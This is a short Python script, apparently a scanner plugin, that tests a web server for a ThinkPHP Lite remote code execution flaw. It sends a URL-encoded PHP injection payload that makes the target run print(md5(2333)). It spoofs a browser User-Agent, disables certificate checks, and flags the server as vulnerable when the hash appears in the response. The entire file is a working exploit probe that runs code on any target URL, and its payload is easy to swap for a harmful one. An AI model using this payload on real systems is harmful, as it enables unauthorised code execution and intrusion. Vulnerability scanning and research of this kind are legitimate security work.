import urllib
import requests


def verify(url):
    relsult = {
        'name': 'thinkphp_lite_code_exec',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        payload = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl
        return relsult

    except:
        return relsult